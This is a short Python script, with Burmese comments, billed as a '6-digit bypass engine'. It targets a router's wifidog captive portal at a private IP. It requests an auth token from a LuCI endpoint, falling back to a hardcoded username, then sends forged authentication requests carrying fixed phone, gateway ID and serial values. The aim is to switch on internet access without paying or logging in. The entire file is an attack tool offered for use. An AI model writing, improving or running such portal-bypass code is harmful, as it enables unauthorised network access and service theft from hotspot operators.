import sys, os, hashlib, subprocess, datetime, requests, time
from colorama import Fore, init

init(autoreset=True)

def run_6digit_hack():
    # အစ်ကို့ Canary အချက်အလက်များ
    TARGET = {
        "ip": "192.168.110.1",
        "user": "810852",
        "phone": "381060",
        "id": "58b4bbd9c1e9",
        "sn": "H1U42FJ004707"
    }
    
    print(f"{Fore.YELLOW}[*] Bypassing Router Gate...")
    with requests.Session() as s:
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
        try:
            # Token Injection
            t_url = f"http://{TARGET['ip']}/cgi-bin/luci/api/auth/token?username={TARGET['user']}"
            token = s.get(t_url, timeout=5).json().get("token", TARGET['user'])
            
            # 6-Digit Hack Force
            auth_url = f"http://{TARGET['ip']}:2060/wifidog/auth"
            p = {"token": token, "phoneNumber": TARGET['phone'], "gw_id": TARGET['id'], "gw_sn": TARGET['sn']}
            
            s.get(auth_url, params=p, timeout=5)
            s.post(auth_url, data=p, timeout=5)
            
            print(f"{Fore.GREEN}[✔] SUCCESS: INTERNET ACTIVATED!")
        except:
            print(f"{Fore.RED}[✘] FAILED: PLEASE CHECK WIFI OR VPN.")

if __name__ == "__main__":
    os.system('clear')
    print(f"{Fore.CYAN}========================================")
    print(f"{Fore.WHITE}      YUTA 6-DIGIT BYPASS ENGINE")
    print(f"{Fore.CYAN}========================================")
    
    # Bypass ကို ခေါ်မယ်
    run_6digit_hack()
    
    print(f"{Fore.CYAN}========================================")
